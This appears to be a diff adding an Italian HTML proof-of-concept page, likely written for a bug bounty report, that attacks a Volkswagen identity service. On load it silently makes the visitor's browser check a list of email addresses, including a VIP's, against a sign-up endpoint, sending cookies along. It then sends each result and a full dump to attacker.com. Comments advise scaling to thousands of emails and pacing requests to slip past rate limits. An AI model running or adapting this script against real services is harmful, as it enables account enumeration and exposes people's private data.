@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>Volkswagen ID Checker (innocuo...)</title>
+</head>
+<body>
+  <h1>Caricamento...</h1>
+  <p id="status">Attendi un attimo...</p>
+
+  <script>
+    // Lista di email da testare (in real attack: caricata da un file o generata)
+    const emailsToCheck = [
+      "mario.rossi@gmail.com",
+      "anna.verdi@libero.it",
+      "codenamevenom@bugcrowdninja.com",
+      "presidente@quirinale.it",           // test per VIP / noti
+      // ... puoi caricare migliaia da un array o fetch
+    ];
+
+    const clientId = "4fb52a96-2ba3-4f99-a3fc-583bb197684b@apps_vw-dilab_com";
+    const results = {};
+
+    async function checkEmail(email) {
+      try {
+        const response = await fetch("https://identity.vwgroup.io/v2/login/ui/sign-up/check-email", {
+          method: "POST",
+          credentials: "include",
+          mode: "cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email, clientId })
+        });
+
+        if (!response.ok) throw new Error("Non 200");
+
+        const data = await response.json();
+        results[email] = data.exists === true ? "ESISTE" : "NON esiste";
+
+        // Invia al server attaccante (es. webhook o tuo endpoint)
+        fetch("https://attacker.com/log", {
+          method: "POST",
+          body: JSON.stringify({ email, exists: data.exists, timestamp: Date.now() })
+        }).catch(() => {});
+
+      } catch (err) {
+        results[email] = "ERRORE: " + err.message;
+      }
+    }
+
+    async function runChecks() {
+      document.getElementById("status").textContent = "Sto controllando... non chiudere la pagina!";
+      
+      for (const email of emailsToCheck) {
+        await checkEmail(email);
+        await new Promise(r => setTimeout(r, 800)); // evita rate-limit se presente
+      }
+
+      // Alla fine mostra o invia tutto
+      console.log("RISULTATI:", results);
+      document.getElementById("status").innerHTML = 
+        "<h2>Controllo completato!</h2><pre>" + JSON.stringify(results, null, 2) + "</pre>";
+      
+      // Invia tutti i risultati all'attaccante
+      fetch("https://attacker.com/full-dump", {
+        method: "POST",
+        body: JSON.stringify(results)
+      });
+    }
+
+    // Avvia automaticamente quando la vittima carica la pagina
+    window.onload = runChecks;
+  </script>
+</body>
+</html>
